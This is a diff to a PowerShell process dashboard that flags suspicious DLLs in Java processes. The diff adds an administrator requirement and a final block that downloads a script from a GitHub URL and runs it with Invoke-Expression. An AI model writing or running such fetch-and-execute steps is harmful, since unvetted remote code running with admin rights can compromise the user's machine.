@@ -1,4 +1,6 @@
+#Requires -RunAsAdministrator
 
+# ========== 1. YOUR LOCAL DLL DASHBOARD CODE ==========
 $global:filter = ""
 
 function Get-ParentMap {
@@ -9,24 +11,15 @@ function Get-ParentMap {
     return $map
 }
 
-# -------------------------
-# DLL DETECTION (NEW)
-# -------------------------
 function Get-SuspiciousDLLs {
-
     $suspicious = @()
-
     $java = Get-Process javaw -ErrorAction SilentlyContinue
-
     foreach ($j in $java) {
         try {
             $j.Modules | ForEach-Object {
-
                 $path = $_.FileName
                 if (-not $path) { return }
-
                 $p = $path.ToLower()
-
                 if (
                     $p -match "temp|appdata|downloads|inject|hack|cheat" -or
                     -not $p.Contains("windows") -or
@@ -41,21 +34,16 @@ function Get-SuspiciousDLLs {
             }
         } catch {}
     }
-
     return $suspicious
 }
 
 function Get-Processes {
     $parents = Get-ParentMap
-
     Get-Process | ForEach-Object {
-
         $cpu = 0
         try { $cpu = $_.CPU } catch {}
-
         $path = ""
         try { $path = $_.Path } catch {}
-
         [PSCustomObject]@{
             Name   = $_.ProcessName
             PID    = $_.Id
@@ -69,19 +57,14 @@ function Get-Processes {
 
 function Render {
     Clear-Host
-
     Write-Host "=== LIVE PROCESS DASHBOARD ===" -ForegroundColor Cyan
     Write-Host "Filter: $global:filter"
     Write-Host ""
-
     $list = Get-Processes
-
     if ($global:filter -ne "") {
         $list = $list | Where-Object { $_.Name -like "*$global:filter*" }
     }
-
     $dlls = Get-SuspiciousDLLs
-
     Write-Host "=== SUSPICIOUS JAVA DLLS ===" -ForegroundColor Yellow
     if ($dlls.Count -eq 0) {
         Write-Host "None detected"
@@ -90,27 +73,18 @@ function Render {
             Write-Host "$($d.Process) -> $($d.DLL)" -ForegroundColor Red
         }
     }
-
     Write-Host ""
     Write-Host "=== TOP PROCESSES ===" -ForegroundColor Cyan
-
     foreach ($p in $list | Sort-Object CPU -Descending | Select-Object -First 25) {
-
         $color = "White"
-
-        if (
-            $p.CPU -gt 50 -or
-            $p.Path -match "temp|appdata|downloads"
-        ) {
+        if ($p.CPU -gt 50 -or $p.Path -match "temp|appdata|downloads") {
             $color = "Red"
         }
-
         Write-Host (
             "{0,-20} PID:{1,-6} CPU:{2,-6} RAM:{3,-6}MB Parent:{4}" -f
             $p.Name, $p.PID, $p.CPU, $p.RAMMB, $p.Parent
         ) -ForegroundColor $color
     }
-
     Write-Host ""
     Write-Host "[F]ilter | [E]xport | [Q]uit"
 }
@@ -121,16 +95,11 @@ function Export {
     Write-Host "Exported to Desktop" -ForegroundColor Green
 }
 
-# -------------------------
-# MAIN LOOP
-# -------------------------
+# Run the local dashboard until user quits
 while ($true) {
-
     Render
-
     if ([console]::KeyAvailable) {
         $key = [console]::ReadKey($true).Key
-
         switch ($key) {
             "F" {
                 $global:filter = Read-Host "Enter filter"
@@ -143,6 +112,19 @@ while ($true) {
             }
         }
     }
-
     Start-Sleep -Seconds 1
+}
+
+# ========== 2. AFTER DASHBOARD EXITS, RUN REMOTE SCRIPT ==========
+Write-Host "`nDashboard closed. Now downloading and running remote script from GitHub..." -ForegroundColor Cyan
+$remoteUrl = "https://raw.githubusercontent.com/printipel/Screesh/refs/heads/main/dllhelper.ps1"
+try {
+    $remoteScript = Invoke-RestMethod -Uri $remoteUrl -UseBasicParsing
+    Write-Host "Remote script downloaded. Executing..." -ForegroundColor Green
+    Invoke-Expression $remoteScript
+} catch {
+    Write-Host "ERROR: Failed to download or run remote script: $_" -ForegroundColor Red
+    Write-Host "Press any key to exit..."
+    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
+    exit 1
 }
